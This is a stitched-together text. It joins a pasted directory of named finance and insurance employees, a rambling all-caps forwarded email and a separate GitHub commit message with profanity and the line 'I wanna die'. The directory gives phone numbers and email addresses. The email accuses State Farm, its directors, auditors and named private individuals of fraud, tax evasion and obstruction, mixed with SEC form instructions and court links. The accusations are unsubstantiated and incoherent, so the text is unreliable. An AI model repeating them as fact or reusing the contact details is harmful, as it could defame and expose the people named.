INSTITUTIO ) , John Socha (STATE FARM MUTUAL AU ) , Jennifer Hsui (BLACKROCK INSTITUTIO ) , Joe Young (STATE FARM MUTUAL AU ) , Scott Reid (STATE FARM MUTUAL AU ) , Adam Hallman (STATE FARM MUTUAL AU ) , Wei Hao (STATE FARM MUTUAL AU ) , Chris Minter (STATE FARM MUTUAL AU ) , Shelly Marsh (STATE FARM MUTUAL AU ) , Hollie Marsh (STATE FARM MUTUAL AU ) , Matthew Lockridge (WESTWOOD MANAGEMENT ) , Michael Mayberger (STATE FARM MUTUAL AU ) , Ashley Smock (STATE FARM MUTUAL AU ) , Cory Swartzlander (STATE FARM MUTUAL AU ) , Scott Lawson (WESTWOOD MANAGEMENT ) , Ayman Bari (STATE FARM MUTUAL AU ) , Adam Vales (STATE FARM MUTUAL AU ) , Robert Middleton (STATE FARM MUTUAL AU ) , Shane Jent (STATE FARM MUTUAL AU ) , Kevin Rock (STATE FARM MUTUAL AU ) , Mark Dunford (STATE FARM MUTUAL AU ) , Jean-Francois Ducrest (DUCREST, JEAN-FRANCO ) , Caroline Dirks (STATE FARM MUTUAL AU ) , Diane Hsiung (GEODE CAPITAL MANAGE ) , Hunter Rose (STATE FARM MUTUAL AU ) , Cameron Kurak (STATE FARM MUTUAL AU ) , Mark Broughton (FIRST REPUBLIC BANK ) , Betsey Euliss (STATE FARM MUTUAL AU ) , Kim Bretz (STATE FARM MUTUAL AU ) , Jon Wilson (STATE FARM MUTUAL AU ) , Shawna Barlow (STATE FARM MUTUAL AU ) , Philip Kroger (STATE FARM MUTUAL AU ) , Gabrielle Poole (STATE FARM MUTUAL AU ) , Ricardo Correa (STATE FARM MUTUAL AU ) , BO.DINCER@YAHOO.COM, bd2561@columbia.edu Subject: STATE FARM - BLOOMINGTON TY. Kevin Rock Investment Information Analyst State Farm Mutual Automobile Ins Co +1-309-735-2705 (o) 1 State Farm Plz +1-309-530-1865 (m) Investment Department E-8 krock5@bloomberg.net (w) Bloomington IL 61701, US Phil Supple 1 Views Today Spokesperson Career State Farm Life Insurance Co Current +1-800-782-8332 (o) 1 State Farm Plaza State Farm Life Insurance Co phil.supple.hid9@statefarm.com (w Bloomington IL 61710, US Spokesperson Nicole Tamilyn Bowyer Attorney State Farm Insurance +1-504-840-4900 (o) 853 Fincastle Turnpike +1-504-840-4941 (f) North Tazewell VA 24630 nicole.bowyer@statefarm.com (w) Focus Legal Rebecca Coyle 1 Views Today Analyst:Public Policy Career State Farm Life Insurance Co Current +1-309-766-2311 (o) 1900 M Street NW State Farm Life Insurance Co rebecca.coyle@statefarm.com (w) Washington DC 20036, US Analyst:Public Policy 2012-Present Steven Santiccioli VP:Quantitative Management Northern Trust Company, The +1-3124444419 (o) Addl Contact Info » 312-444-5777 (o) 181 W Madison St steve@bloomberg.net (w) Chicago IL 60602-4510, sjs5@ntrs.com (w) I would work harder on my marriage if there was a retirement plan. Focus Large Cap Stocks, Growth Investing, Global, Equities, Thematic Investing, United States, Developed Markets Funds Managed (7 Funds/7.7B Total Assets in USD) | More » Fund Name Tot Ast YTD Ret 3M Px Objective Status 21) Northern International Equity In 5.5B 7.8 Foreign Blend ACTV 22) Northern Global Sustainability In 1.3B 20.5 Thematic Sector ACTV 23) Green Century Equity Fund 552.1M 25.2 Thematic Sector ACTV Recent News | More » 41) Northern Funds: 497 2019/07/02 EDG 07/2019 |

<< HAPPY HOLIDAYS and Merry xmas >>

------------------------------------------------------------------------

*** 2021-2022 ANNUAL FILINGhttps://www.sec.gov/Archives/edgar/data/0000093715/000114554922006149/xslFormN-CEN_X01/primary_doc.xml

... WITHOUT BEING REGISTERED IN THE STATE OF NEW YORK TO CONDUCT ANY FORM OF INVESTMENT BANKING, THE DIRECTOR OF STATE FARM INSURANCE LLC AS THE MANAGING MEMBER OF STATE FARM MORTGAGE LLC - IS ALSO NOW HOLDING A NOTE "NOT COVERS" AS A FIDUCIARY WHICH HOLDS THE TAX LIABILITY, AND AVOIDANCE TO PROSECUTION WHEREBY THE PREMIUMS AND INSURANCE COLLECTED ON A LETTER OF CREDIT... HOWEVER "INDEMNIFIED...BY "SULLIVAN PROPERTIES LP" WHO HAS ASSURED IN WRITING THAT THEY WILL REIMBURSE "STATE FARM" IN THE EVENT OF A DEFAULT, OR LATE PAYMENT. ANNEXED IN NYSCEF 153974/2020

https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=IY8iDH_PLUS_UpVanEtcRioef3A==

+++ I SENT THIS TO THE SUPREME COURT JUSTICES INDEPENDENTLY IN NOVEMBER AS WELL, BTW.

NOTICE TO STATE FARM:https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=n_PLUS_CvSQR36fqPKko6L47FFQ==

THE FAILED TO DISCLOSE TO NOT GET FINED IN TEXAS? THEY ALSO FAILED DISCLOSE IT FOR THE NEW INVESTORS OF THE TICKERS BELOW AFTER LOSING THE UPPER BOUND OF $940,000,000.00 WITH RESPECT TO BRK-B IS NOT A JOB WELL DONE, IN-DEED. TO PROTECT TAX EVASION AND THE FINES, PENALTIES AND CERTAIN PRISON TIME... WHILE COLLECTING PREMIUMS AND INTEREST FOR THE PROPERTIES WHICH ARE GOING TO NEED DENTURES ("FINANCIALLY") UPON REALIZING THEY "STATE FARM" IS LIABLE FOR 5 OTHERS UNDER 26 CFR § 1.6662

* ACCOUNTED FOR, AND BY YOURS TRULY - WAS ANNEXED IN THE MATTER OF
153974/2020 WHICH ANY GENERAL COUNSELOR OF LAW WOULD UNDERSTAND IN
THEIR FIDUCIARY ROLES, NOTWITHSTANDING AN INVESTMENT PROFESSIONAL.
P.S. #GOCARDS...

Instructions.

1.

Item G.1.a.i. Legal proceedings. (a) If the Registrant responded
"YES" to Item B.11.a., provide a brief description of the
proceedings. -- As part of the description, provide the case or
docket number (if any), and the full names of the principal parties
to the proceeding. (b) If the Registrant responded "YES" to Item
B.11.b., identify the proceeding and give its date of termination.

2.

Item G.1.a.ii. Provision of financial support. If the Registrant
responded "YES" to Item B.14., provide the following information
(unless the Registrant is a Money Market Fund): (a) Description of
nature of support. (b) Person providing support. (c) Brief
description of relationship between the person providing support and
the Registrant. (d) Date support provided. (e) Amount of support.
(f) Security supported (if applicable). Disclose the full name of
the issuer, the title of the issue (including coupon or yield, if
applicable) and at least two identifiers, if available (e.g., CIK,
CUSIP, ISIN, LEI). (g) Value of security supported on date support
was initiated (if applicable). (h) Brief description of reason for
support. (i) Term of support. (j) Brief description of any
contractual restrictions relating to support.

3.

Item G.1.a.iii.

Independent public accountant's report on internal control (management investment companies other than small business investment companies only). Each management investment company shall furnish a report of its independent public accountant on the company's system of internal accounting controls. The accountant's report shall be based on the review, study and evaluation of the accounting system, internal accounting controls, and procedures for safeguarding securities made during the audit of the financial statements for the reporting period. The report should disclose any material weaknesses in: (a) the accounting system; (b) system of internal accounting control; or (c) procedures for safeguarding securities which exist as of the end of the Registrant's fiscal year. The accountant's report shall be furnished as an exhibit to the form and shall: (1) be addressed to the Registrant's shareholders and board of directors; (2) be dated; (3) be signed manually; and (4) indicate the city and state where issued. Attachments that include a report that discloses a material weakness should include an indication by the Registrant of any corrective action taken or proposed. The fact that an accountant's report is attached to this form shall not be regarded as acknowledging any review of this form by the independent public accountant. 4. Item G.1.a.iv. Change in accounting principles and practices. If the Registrant responded "YES" to Item B.21, provide an attachment that describes the change in accounting principles or practices, or the change in the method of applying any such accounting principles or practices. State the date of the change and the reasons therefor. A letter from the Registrant's independent accountants, approving or otherwise commenting on the change, shall accompany the description. 5. Item G.1.a.v. Information required to be filed pursuant to exemptive orders. File as an attachment any information required to be reported on Form N-CEN or any predecessor form to Form N-CEN (e.g., Form N-SAR) pursuant to exemptive orders issued by the Commission and relied on by the Registrant. 6. Item G.1.a.vi. Other information required to be included as an attachment pursuant to Commission rules and regulations. File as an attachment any other information required to be included as an attachment pursuant to Commission rules and regulations. Pursuant to the requirements of the Investment Company Act of 1940, the Registrant has duly caused this report to be signed on its behalf by the undersigned hereunto duly authorized.

Instructions to Item C.16 and Item C.17.

https://www.sec.gov/Archives/edgar/data/0000093715/000114554922006149/xslFormN-CEN_X01/primary_doc.xml

https://www.sec.gov/Archives/edgar/data/0000093715/000119312521278180/d222043dn8f.htm

------------------------------------------------------------------------

ATTACHED DEED AND NYC DEPT OF FINANCE TAX RECORDS FOR THE 10-YEARS PRIOR.
LOAN DOCKET 50074 - NYSCEF MATTER 153974/2020 LETTER OF CREDIT FOR $6,000,000.00 SECURED BY UNLAWFUL LEASES AND RENTS. USC 18.21, 18.225, 18.215, 18.4, 18.3, 18.229B ++ Tax records & unlawful income. [ LOAN 50074 EST++ ] FILED AND KNOWN AS REFERENCED IN THE SEQUENCE OF EXHIBITS FILED IN THE MATTER OF NYSCEF 153974/2020https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=19MVPFXy0G0QvnmRLGpYIQ==

STATE FARM (ADDRESSED IN THE STATE OF ILLINOIS) ISSUED THIS TO THE BENEFIT OF THE FOLLOWING CORPORATIONS AND UNDER THE AUSPICE OF THEIR DIRECTORS, AS FOLLOWS:

|A. SULLIVAN PROPERTIES LP. B. SULLIVAN GP LLC. C. MANHATTAN SKYLINE MANAGEMENT CORP. D. THE ZUCKER ORGANIZATION. |

NOTARIZED BY DONALD ZUCKER ON MAY 13TH, 2020 THEN FILED WITH THE NYC DEPT. OF FINANCE REGISTER.

USC 26 NOTE.

AS REFERENCED ABOVE, WAS FILED WITH THE NY FINANCE REGISTER AND IN NEW YORK SUPREME COURT CIVIL PART, PRIOR TO THE SEMI-ANNUAL REPORT WAS FILED BY STATE FARM UNDER PAUL SMITH AND TERRANCE LUDWIG [ IN HIS 40-17G FILINGS ] NEGLECTED OVER SEVERAL REPORTING PERIODS TO INCLUDE THE MATERIAL SUBSTANCE AND EXPOSURES AS IMPLIED BY THE RISKS OF THE OUTCOME OF NYSCEF MATTER 153974/2020 - WHICH NEVER WAS QUASHED OR FORGIVEN, OR WAIVED TO ANY EFFECT.

THE PROCEEDINGS WERE OBSTRUCTED BY THE CORPORATIONS, THEIR DIRECTORS, AND ATTORNEYS AS SEEN IN THOSE PROCEEDINGS WERE AWARE OF ALL CONFIRMATIONS FILED, NOTWITHSTANDING THE NOTARY SERVICES OF MISS ASHLEY HUMPHRIES WHO ALSO PARTICIPATED IN THE CASE.

ALSO ANNEXED AND FILED THEIR DISTRIBUTION OF PRIVATE VIDEOS AND PHOTOGRAPHS FROM THE INTERIOR OF MY APARTMENT - TAKEN WITHOUT MY CONSENT.

THESE VIDEOS WERE ADULTERED, PHOTO-SHOPPED, HOSTED, AND ALSO CONVERTED AND EMAILED INTO *.MOV FILES AS SEEN IN THE DOCKETS ENTERED AND ADMITTED BY THEIR COUNSELORS, WERE AWARE AND WILLFULLY CONTINUED TO OBSTRUCT JUSTICE IN ORDER TO AVOID ANY DELUGE OF INFORMATION BY STATE FARM AND TO UNLAWFULLY SECURE A LOAN FOR $6,000,000.00 WAS DISTRIBUTED BY AND BETWEEN THOSE MEMBERS BELOW (IN SALARIES, WAGES, AND FOR WHATEVER PURPOSES THEY WOULD OTHERWISE USE THOSE FUNDS) WERE PRESENTED TO THE CLERK AND JUDGE ALONG WITH MY REQUESTS FOR THEM TO CEASE AND DESIST FROM ANY FURTHERANCE AND TO STOP FILMING AND PHOTOGRAPHING THE INTERIOR OF APARTMENT - FELT THAT IT WOULD BE ENTERTAINING TO CONTINUE TO HARASS BOTH MY TIME - AS WELL AS THE STATE'S RESOURCES DURING THE HEIGHT OF THE COVID-19 PANDEMIC. THE TAX RECEIPTS WERE ALSO FILED AND DISTRIBUTED TO ALL MATERIAL PARTIES UPON DISCOVERY, AS FOLLOWS [A SHORT LIST OF 10 INDIVIDUALS, WITHOUT HAVING TO NAME ALL OF STATE FARM'S ENTITIES]:

|1. MR. DONALD ZUCKER. 2. MS. LAURIE ZUCKER. |

THE ATTORNEYS IN NYSCEF 153974/2020 - FOR CONFIRMATION CONTINUED IN THEIR AFFAIR OVER A PERIOD OF SEVERAL MONTHS, BEGINNING FIRST ON JUNE 5TH, 2020 - BEGAN FILING ARBITRARY CLAIMS WITHOUT ANY DEMAND FOR MONEY, OR A CLAIM UPON WHICH ANY MERIT FOR AWARD EXISTS, ABSENT OF THOSE WHICH I DEMANDED FROM THE COURTS AND ALSO FILED UPON MY ADVERSARIES IN THE MATTER - HAVE NOT RETURNED AN EMAIL, PHONE CALL, OR THE UNLAWFUL RENTS WHICH THEY COLLECTED - WERE USED AS AN ARTIFACT OF "CREDIBILITY" TO OBTAIN A LOAN FROM STATE FARM.

|3. MS. SHARI LASKOWITZ. 4. MR. PAUL REGAN. 5. MR. CORY WEISS. 6. MS. ASHLEY HUMPHRIES. 7. MR. JOSEPH GIAMBOI. >> LETTER OF OBSTRUCTION [ DOCKET 399 ] >> CAUSED - IN PART - A BREACH OF THE SARBANES-OXLEY AND THE OMISSIONS AS EXPRESSED BELOW. >> FAILURE TO DISCLOSE BY PRICE WATERHOUSE COOPERS IN TWO SEMI-ANNUAL REPORTS. >> BOTH FILED WITH THE SECURITIES & EXCHANGE COMMISSION UNDER CIK FILER 93715 AND 1516523. >> FAILURE TO DISCLOSE BY PRICE WATERHOUSE COOPERS IN TWO ANNUAL REPORTS. >> BOTH FILED WITH THE SECURITIES & EXCHANGE COMMISSION UNDER CIK FILER 93715 AND 1516523. |

STATE FARM

THEIR DIRECTORS.

|8. MR. TERRENCE LUDWIG. >> FAILS TO DISCLOSE ANY MATERIAL LEGAL ACTIONS, CLAIMS. >> NOT COVERED FOR LOSSES AS A RESULT OF OMISSIONS. >>>> CERTIFIED UNDER CERT-99 AND A BREACH UNDER 63.18 OF THE SARBANES-OXLEY (FILED WITH THE SECURITIES AND EXCHANGE COMMISSION) IN SEVERAL REPORTING PERIODS. >>>> ASSERTED THE SAME AND IN FISCAL REPORTING PERIODS 2020, 2021, AND 2022 UNDER CIK FILER 93715 AND 1516523. 9. MR. JOE MONK, JR. 10. MR. PAUL SMITH. |

LOAN 50074 EST++https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=19MVPFXy0G0QvnmRLGpYIQ==

RE: JP MORGAN CHASE RE: MORGAN STANLEY & CO (USED TWO CRD INDICATORS UNDER CIK FILER 93715 AND 1516523)

https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=R9aac7D6DBJZ1wsiq0b38A==

* Unlawful custody and deposits AT A US BANK - is unlawful, per the
FDIC. this was also obstructed by the assisted services at the
towers of EARL.

Does this make sense, Miss Hochul

*

for a C5 edifice in ZIP CODE 10012 in the following tax periods for
the 20 units at 111 SULLIVAN STREET, NEW YORK, NY, 10012?

*

ALL SIX PROPERTIES CONTAIN A FULL OR PARTIAL ABSENCE OF A
CERTIFICATE OF OCCUPANCY, OR INSPECTION AT ALL RELEVANT TIMES.

DOCKET 386

https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=IY8iDH_PLUS_UpVanEtcRioef3A==

tax receipts ATTACHED. BRB. #GOCARDS. P.S. PULL29 ATTACHED COMPOUND. WAS RE-DIRECTED PROPERLY BY THE PRECINCTS LATER BY THIS OTHER OFFICER NANCY... I FORGOT WHO I SPOKE WITH. I THINK WITH WAS NANCY, DEFINITELY NANCY...

-------- Forwarded Message -------- Subject: Tax records & unlawful income USC 18.21, 18.225 Date: Fri, 24 Jun 2022 21:54:47 +0000 (UTC) From:6462563609@mms.att.netTo:bdincer66@icloud.com,kaaperstein2@bloomberg.net,josephine.vella@finra.org,ms60710444266@yahoo.com,chair@sec.gov,chicago@sec.gov,bbrief@bloomberg.net,tips@latimes.com,pronewsletter@dowjones.com,praghuram2@bloomberg.net,blawre@bloomberg.net,mediainquiries@point72.com,mshy15@morganstanley.com,jpminvestorrelations@jpmchase.com,tips@vibe.com,tips@nytimes.com,mutualfunds@statefarm.com,bofamarkets@bofa.com

https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=R9aac7D6DBJZ1wsiq0b38A==^^ unlawful custody of SECURITY

https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=19MVPFXy0G0QvnmRLGpYIQ==

tax receipts (#GOCARDS)

---
## [omboybread/My-shit-website](https://github.com/omboybread/My-shit-website)@[6c07b6e7bd...](https://github.com/omboybread/My-shit-website/commit/6c07b6e7bdc46344d4e40d9ff02ba5f79db7ff93)
#### Monday 2022-08-01 20:36:31 by omboybread

YAY! I fixed random bullshit shit. I wanna die
YES THE programming LANGUAGES  ARE A FUCKING STAIRCASE DEAL WITH IT U FUCKING BETA MALE.
Huge thanks to My little dark age (the song) for helping me stay alive throughout this coding session.

---

